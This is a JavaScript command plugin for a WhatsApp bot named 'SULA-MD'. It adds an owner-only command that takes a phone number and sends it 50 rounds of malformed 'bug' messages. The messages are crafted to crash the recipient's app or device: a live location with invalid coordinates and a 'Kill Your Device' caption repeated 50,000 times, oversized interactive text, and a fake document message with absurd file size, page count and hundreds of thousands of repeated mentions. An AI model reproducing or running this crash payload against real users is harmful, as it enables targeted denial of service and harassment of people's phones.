const { fetchJson } = require('../lib/functions')
const config = require('../config')
const { cmd, commands } = require('../command')

cmd({
    pattern: "fuck",
    react: "💥",
    desc: "Send a series of operations to a target number.",
    category: "utilities",
    use: ".fuck <phone_number>",
    filename: __filename
}, async (conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
    try {
        if (!isOwner) {
            return reply("❌ This command is for Owner Only.");
        }
        if (!q) {
            return reply(`\`Example:\` : ${prefix + command} 628×××`);
        }
        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`✔️ Bug sent successfully.`);
        
async function ngeloc(target, quoted) {
    try {
        const liveLocationMessage = {
            "liveLocationMessage": {
                "degreesLatitude": "p", 
                "degreesLongitude": "p", 
                "caption": `𝐒𝐔𝐋𝐀-𝐌𝐃` + "Kill Your Device".repeat(50000),
                "sequenceNumber": "0",
                "jpegThumbnail": "" 
            }
        };

        const etc = generateWAMessageFromContent(target, proto.Message.fromObject({
            viewOnceMessage: {
                message: liveLocationMessage
            }
        }), { userJid: target, quoted: kuwoted });
await conn.relayMessage(target, etc.message, { participant: target, messageId: etc.key.id });

        console.log(`Sent live location message to ${target}`);

    } catch (error) {
        console.error("Error in ngeloc function:", error);
    }
}


async function func1(target) {

    const message = {
        interactiveMessage: {
            header: {
                locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0
                },
                hasMediaAttachment: true,
            },
            body: {
                text: "𝐒𝐔𝐋𝐀-𝐌𝐃" + "䲹瑾ױ妋ᇪ䓫䭑㏶営疻㼬㤉攁濶⵷ᾈਰ䄪⃣双斐७檧浥❵夸刋淫歀旵穴ᭁ灭㜐䔎㖄砥⌻ẸⅮΏФ慠ጰ䀡̠佮⍰ৰ〨熔㸆㺗朜帏紇渥㚆䵙Ϫ亸磾૥㠳怨㴢㱈ل吡ᣂୡẽĭṛ椀伩吣㊛⪠怭壚ጁܲ熣ཱི⌽塑埩糝⿶൴ⶶ旣❏ఫඳ罎示㼓兄汆ᜮ楝ᬪ炘ዓ㡆⺞㚻ᶩ᜘⦆䰸憔᠀㿸ዼ曇峴ᯰ⌮䗀ཽò巿桚泡勜纺㎗ᠤ敐゠⎙ྸ㎏剪ᣲ㩑䪕㤛畼".repeat(100)  
            },
            nativeFlowMessage: {},
            contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 𝐒𝐔𝐋𝐀-𝐌𝐃 " }]
            }
        }
    };
    try {
        await conn.relayMessage(target, message, { participant: { jid: target } });
    } catch (error) {
        console.error('Error sending the message:', error);
    }
}


async function DocBug(target) {
    let virtex = "𝐒𝐔𝐋𝐀-𝐌𝐃"; 

    const message = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                           
 url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "99999999999",  
                            pageCount: 0x9184e729fff, 
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=", 
                            fileName: virtex, 
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",  
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0', 
 mediaKeyTimestamp: "1715880173", 
                            contactVcard: true  
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "⚡𝐒𝐔𝐋𝐀-𝐌𝐃⚡" + "ꦾ".repeat(100000) + "@1".repeat(300000) 
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"), 
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐒𝐔𝐋𝐀-𝐌𝐃" }]
                    }
                }
            }
        }
    };

    try {
        await conn.relayMessage(target, message, { participant: { jid: target } });
        console.log("Message successfully sent to", target);
    } catch (error) {
        console.error('Error sending message to', target, error);
    }
}
        for (let i = 0; i < 50; i++) { 
            await func1(target);
            await sleep(500);
            await ngeloc(target);
            await sleep(100);
            await DocBug(target);
        }

    } catch (error) {
        console.error("Error in agler plugin:", error);
        return reply("❌");
    }
});
